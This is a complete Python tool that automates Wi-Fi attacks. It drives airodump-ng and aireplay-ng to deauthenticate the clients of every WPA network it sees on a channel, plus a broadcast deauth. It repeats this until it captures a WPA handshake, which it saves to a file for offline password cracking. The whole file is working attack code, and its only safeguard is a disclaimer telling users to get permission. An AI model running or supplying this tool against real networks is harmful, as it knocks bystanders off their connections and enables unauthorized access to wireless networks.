#!/usr/bin/env python3

'''
This script sends 802.11 deauth packets.
Don't be stupid - get permission and use responsibly.
I'm not your lawyer.
'''

import curses
import threading
import datetime as dt
from time import sleep
import subprocess as sp
from pathlib import Path
from sys import stderr, stdout
import xml.etree.ElementTree as xml
from tempfile import TemporaryDirectory
from argparse import ArgumentParser, ArgumentError


class WiFiNetwork():

    def __init__(self, netxml, interface):
        '''
        takes & parses "wireless-network" xml object
        '''

        self.interface      = interface
        self.bssid          = netxml.find('BSSID').text.upper()
        self.type           = netxml.attrib['type']
        self.ssid           = '<unknown>'
        self.encryption     = ''

        try:
            if self.type != 'probe':
                ssid = netxml.find('SSID')
                encryption = ssid.findall('encryption')
                if any('WEP' in e.text for e in encryption):
                    self.encryption = 'WEP'
                elif any('WPA' in e.text for e in encryption):
                    self.encryption = 'WPA'
                else:
                    self.encryption = 'OPEN'
                essid = ssid.find('essid').text
                if essid:
                    self.ssid = essid
        except:
            pass

        try:
            self.man        = netxml.find('manuf').text
        except:
            self.man        = 'Unknown'

        self.packets        = int(netxml.find('packets').find('total').text)
        
        self.last_seen      = dt.datetime.strptime(netxml.attrib['last-time'], "%a %b %d %X %Y")
        self.clients        = [WiFiClient(c) for c in netxml.findall('wireless-client')]

        self.handshake      = False
        

    def update(self, network):

        self.ssid           = network.ssid
        self.last_seen      = network.last_seen
        self.clients        = network.clients
        self.packets        = network.packets


    def deauth(self, dry_run=False, interval=10):
        '''
        yields series of ( client, (c_ack, a_ack) ) tuples
        '''

        #print('[+] Deauthing {}'.format(str(self)))
        #print('[*] Clients:\n\t{}'.format('\n\t'.join([str(c) for c in self.clients])))

        for client in self.clients:

            cmd = ['aireplay-ng', '-0', '1', '-a', self.bssid, '-c', client.mac, self.interface]

            c_acks, a_acks = 0,0

            self.process = sp.run(cmd, stdout=sp.PIPE, stderr=sp.DEVNULL)
            output = self.process.stdout.decode().split('[')[-1]

            if 'ACKs' in output:
                c_acks, a_acks = [int(n) for n in output.split('ACKs')[0].split('|')]

            yield (self.ssid, client, (c_acks, a_acks))

            sleep(interval)

        # send deauth to broadcast
        cmd = ['aireplay-ng', '-0', '1', '-a', self.bssid, self.interface]
        if not dry_run:
            self.process = sp.run(cmd, stdout=sp.DEVNULL, stderr=sp.DEVNULL)
        yield (self.ssid, WiFiClient('FF:FF:FF:FF:FF:FF'), (0, 0))
        sleep(interval)


    def __str__(self):

        return self.ssid


    def __repr__(self):

        return self.bssid





class WiFiClient():

    def __init__(self, client):
        '''
        takes & parses "wireless-client" xml object
        '''

        self.man    = 'Unknown'

        if type(client) == str:
            self.mac    = client.upper()

        else:
            self.mac    = client.find('client-mac').text.upper()
            try:
                self.man    = client.find('client-manuf').text
            except:
                pass


    def __repr__(self):

        return self.mac


    def __str__(self):

        return '{} [{}]'.format(self.man[:10], self.mac[12:])




class Overseer():

    def __init__(self, channel, interface, write, blacklist=[], whitelist=[], interval=10, dry_run=False, debug=False):

        self.channel            = int(channel)
        self.interface          = interface
        self.write              = write
        self.blacklist          = [str(e).upper() for e in blacklist]
        self.whitelist          = [str(e).upper() for e in whitelist]
        self.interval           = interval
        self.dry_run            = dry_run
        self.debug              = debug

        self.networks           = {}
        self.nlock              = threading.Lock()
        self.networks_sorted    = []

        self.deauths            = []
        self.dlock              = threading.Lock()

        self.handshakes         = []

        self.monitor            = threading.Thread(target=self.run)
        self.main_loop          = threading.Thread(target=self._main_loop)
        self.check_handshakes   = threading.Thread(target=self._check_handshakes)
        
        self.refresh            = 1
        self.max_time           = 10
        
        self.temp_dir           = TemporaryDirectory()

        self.terminate          = False


    def start(self):

        self.monitor.start()
        self.main_loop.start()
        self.check_handshakes.start()

        if self.debug:
            while not self.terminate:
                if self.networks:
                    print('WiFi Networks:')
                    print('\n'.join(str(n) for n in self.get_network()))
                    print('\nDeauths: {}'.format(len(self.deauths)))
                    print('\nHandshakes ({}):'.format(len(self.handshakes)))
                    print('\n'.join(self.handshakes))
                    sleep(self.refresh)

        else:
            try:
                console = curses.initscr()
                curses.noecho()
                curses.cbreak()

                while not self.terminate:

                    with self.dlock:
                        self.deauths = self.deauths[-1000:]

                    #if self.networks:

                    networks = self.get_network()

                    console.clear()

                    middle = {
                        'y': int(curses.LINES / 2),
                        'x': int(curses.COLS / 2)
                    }

                    max_lines = middle['y'] - 4

                    win_top0    = curses.newwin(curses.LINES, curses.COLS, 0, 0)
                    win_bot0    = curses.newwin(middle['y'], middle['x'], middle['y'], 0)
                    win_bot1    = curses.newwin(middle['y'], middle['x'], middle['y'], middle['x'])

                    long_line   = ('-' * (curses.COLS - 1)) + '\n'
                    short_line  = ('-' * (middle['x'] - 1)) + '\n'

                    win_top0.addstr('WiFi Networks:\n' + long_line)
                    win_bot0.addstr('\nHandshakes: ({})\n'.format(len(self.handshakes)) + short_line)
                    win_bot1.addstr('\nDeauths: ({})\n'.format(len(self.deauths)) + short_line)
                    
                    win_top0.addstr('\n'.join([str(s) for s in networks[:max_lines]]))
                    win_bot0.addstr('\n'.join(self.handshakes[:max_lines]))
                    with self.dlock:
                        win_bot1.addstr('\n'.join(['{} <-> {} ({}|{})'.format(d[0][:10], d[1], d[2][0], d[2][1]) for d in self.deauths[-max_lines:]]))
                    
                    win_top0.refresh()
                    win_bot0.refresh()
                    win_bot1.refresh()

                    sleep(self.refresh)

            except Exception as e:
                print('[-] Error in display function: ' + str(e))
                exit(2)
            finally:
                curses.echo()
                curses.nocbreak()
                curses.endwin()



    def stop(self):

        self.terminate = True
        try:
            self.airodump.terminate()
        except:
            pass
        for network in self.networks:
            try:
                network.process.terminate()
            except:
                continue
        self.monitor.join()
        self.main_loop.join()


    def run(self):

        try:
            cmd = ['airodump-ng', '--write-interval', '1', '--update', '999', '-c', str(self.channel), '-w', self.temp_dir.name + '/data', self.interface]
            self.airodump = sp.run(cmd, check=True, stdout=sp.DEVNULL, stderr=sp.DEVNULL)

        except sp.CalledProcessError as e:
            stderr.write('[!] Error in airodump process:\n\t{}'.format(self.airodump.stdout.decode()))

        finally:
            cmd = ['mv', self.temp_dir.name + '/data-01.cap', self.write]
            self.airodump = sp.run(cmd, stdout=sp.DEVNULL, stderr=sp.DEVNULL)
            self.temp_dir.cleanup()


    def get_network(self, bssid=None):

        with self.nlock:
            if not bssid:
                _sorted = list(self.networks.values())
                _sorted.sort(key=lambda x: x.last_seen)
                if _sorted:
                    return _sorted
                else:
                    return []
            else:
                try:
                    return self.networks[bssid.upper()]
                except KeyError:
                    return None


    def put_network(self, network):

        if not self.is_blacklisted(network) and self.is_whitelisted(network) and network.type != 'probe':
            with self.nlock:
                if network.bssid in self.networks:
                    self.networks[network.bssid].update(network)
                else:
                    self.networks[network.bssid] = network


    def is_whitelisted(self, network):

        if self.whitelist:
            return (network.ssid.upper() in self.whitelist) or (network.bssid in self.whitelist)
        else:
            return True


    def is_blacklisted(self, network):

        return (network.ssid.upper() in self.blacklist) or (network.bssid in self.blacklist)


    def deauth_network(self, network):

        while not network.handshake and (dt.datetime.now() - network.last_seen).total_seconds() < self.max_time:
            for result in network.deauth(dry_run=self.dry_run, interval=self.interval):
                with self.dlock:
                    self.deauths.append(result)


    def _main_loop(self):

        sleep(1)

        deauth_threads  = {}

        while not self.terminate:

            for n in self._read_xml(self.temp_dir.name + '/data-01.kismet.netxml'):
                self.put_network( n )

            for network in self.get_network():
                if not network.handshake and not network.bssid in deauth_threads and network.encryption == 'WPA':
                    t = threading.Thread(target=self.deauth_network, args=(network,), daemon=True)
                    t.start()
                    deauth_threads[network.bssid] = t

            for thread in [t for t in deauth_threads.keys()]:
                if not deauth_threads[thread].is_alive():
                    deauth_threads.pop(thread, 0)

            sleep(1)



    def _read_xml(self, f):
        '''
        takes filename of *.kismet.netxml
        yields list of "WiFiNetwork" objects
        '''

        if not Path(f).exists():
            stderr.write("[!] Path \"{}\" does not appear to exist\n".format(str(f)))

        else:
            try:
                tree = xml.parse(str(f))
                root = tree.getroot()

                for netxml in root.findall('wireless-network'):
                    yield WiFiNetwork(netxml, self.interface)

            except xml.ParseError:
                pass


    def _check_handshakes(self):

        cmd = ['wpaclean', self.temp_dir.name + '/wpaclean', self.temp_dir.name + '/data-01.cap']

        while not self.terminate:

            process = sp.run(cmd, stdout=sp.PIPE, stderr=sp.DEVNULL)
            for line in process.stdout.decode().split('\n'):
                if line.startswith('Net'):
                    line = line.split(' ')
                    try:
                        mac = line[1]
                        ssid = ' '.join(line[2:])
                        if not ssid in self.handshakes:
                            self.handshakes.append(ssid)
                            self.get_network(mac).handshake = True
                    except IndexError:
                        continue
            sleep(5)



if __name__ == '__main__':

    ### ARGUMENTS ###

    parser = ArgumentParser(description="PEW PEW")

    parser.add_argument('-c', '--channel',      required=True,              help="channel on which to listen")
    parser.add_argument('-n', '--interval',     default=10,  type=float,    help="deauth interval per AP in seconds (default: 10)")
    parser.add_argument('-s', '--save',         default='./handshakes.cap', help="file in which to save handshakes")
    parser.add_argument('-b', '--blacklist',    default='',                 help="blacklist these ESSIDs or BSSIDs (comma-separated)")
    parser.add_argument('-w', '--whitelist',    default='',                 help="whitelist these ESSIDs or BSSIDs (comma-separated)")
    parser.add_argument('-r', '--dry-run',      action='store_true',        help="don't sent any packets")
    parser.add_argument('--debug',              action='store_true',        help="don't use Curses (print directly to STDOUT)")
    parser.add_argument('interface',                                        help="wireless interface")

    try:

        options = parser.parse_args()
        if options.blacklist:
            options.blacklist = options.blacklist.split(',')
        if options.whitelist:
            options.whitelist = options.whitelist.split(',')

        o = Overseer(options.channel, options.interface, options.save, options.blacklist, options.whitelist, options.interval, options.dry_run, options.debug)
        o.start()


    except ArgumentError:
        stderr.write("\n[!] Check your syntax. Use -h for help.\n")
        exit(2)
    except AssertionError as e:
        stderr.write("[!] {}\n".format(str(e)))
        exit(2)
    except KeyboardInterrupt:
        stderr.write("[*] Cleaning up...")
        o.stop()
        stderr.write("\n[!] Program stopped.\n")
        exit(1)